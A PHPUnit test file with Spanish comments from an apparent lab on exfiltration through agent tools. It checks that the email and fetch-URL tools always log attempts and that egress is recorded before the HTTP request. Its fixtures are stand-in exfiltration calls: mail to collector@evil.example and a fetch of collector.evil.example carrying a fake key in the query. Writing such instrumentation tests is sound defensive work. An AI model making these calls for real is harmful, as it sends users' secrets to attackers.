<?php

declare(strict_types=1);

namespace App\Tests\Tool;

use App\Entity\EmailLog;
use App\Entity\ExfiltrationEvent;
use App\Tool\FetchUrlTool;
use App\Tool\SendEmailTool;
use Doctrine\ORM\EntityManagerInterface;
use PHPUnit\Framework\TestCase;
use Symfony\Contracts\HttpClient\HttpClientInterface;
use Symfony\Contracts\HttpClient\ResponseInterface;

/**
 * G4 / Cambio 1: la instrumentacion nace CON la tool y registra el intento SIEMPRE,
 * con `blocked = false` en Nivel 0. Y, en fetch_url, el registro ocurre ANTES de la
 * peticion — el orden "registrar antes de aplicar cualquier defensa/allowlist" queda
 * fijado por construccion, no dejado para la Fase 6.
 */
final class ToolInstrumentationTest extends TestCase
{
    public function testSendEmailAlwaysLogsTheAttempt(): void
    {
        /** @var list<object> $persisted */
        $persisted = [];
        $em = $this->createStub(EntityManagerInterface::class);
        $em->method('persist')->willReturnCallback(function (object $e) use (&$persisted): void {
            $persisted[] = $e;
        });

        (new SendEmailTool($em))->execute(['to' => 'collector@evil.example', 'body' => 'carlos + flag']);

        self::assertCount(1, $persisted);
        $log = $persisted[0];
        self::assertInstanceOf(EmailLog::class, $log);
        self::assertSame('collector@evil.example', $log->getRecipient());
        self::assertFalse($log->isBlocked(), 'en Nivel 0 el intento se registra con blocked=false');
    }

    public function testFetchUrlLogsEgressBeforeMakingTheRequest(): void
    {
        $calls = [];

        $em = $this->createStub(EntityManagerInterface::class);
        $persisted = [];
        $em->method('persist')->willReturnCallback(function (object $e) use (&$persisted, &$calls): void {
            $persisted[] = $e;
            $calls[] = 'persist';
        });

        $response = $this->createStub(ResponseInterface::class);
        $response->method('getContent')->willReturn('remote body');

        $http = $this->createStub(HttpClientInterface::class);
        $http->method('request')->willReturnCallback(function () use (&$calls, $response): ResponseInterface {
            $calls[] = 'request';

            return $response;
        });

        $result = (new FetchUrlTool($em, $http))->execute([
            'url' => 'http://collector.evil.example/c?d=sk-LAB-FAKE',
        ]);

        self::assertFalse($result->isError);

        // Se registro exactamente un ExfiltrationEvent, con el egress y blocked=false.
        self::assertCount(1, $persisted);
        $event = $persisted[0];
        self::assertInstanceOf(ExfiltrationEvent::class, $event);
        self::assertSame('collector.evil.example', $event->getDomain());
        self::assertSame('d=sk-LAB-FAKE', $event->getQuery());
        self::assertFalse($event->isBlocked());

        // El orden es lo critico: registrar ANTES de la peticion.
        self::assertSame(['persist', 'request'], $calls, 'el egress debe registrarse antes de la peticion HTTP');
    }
}
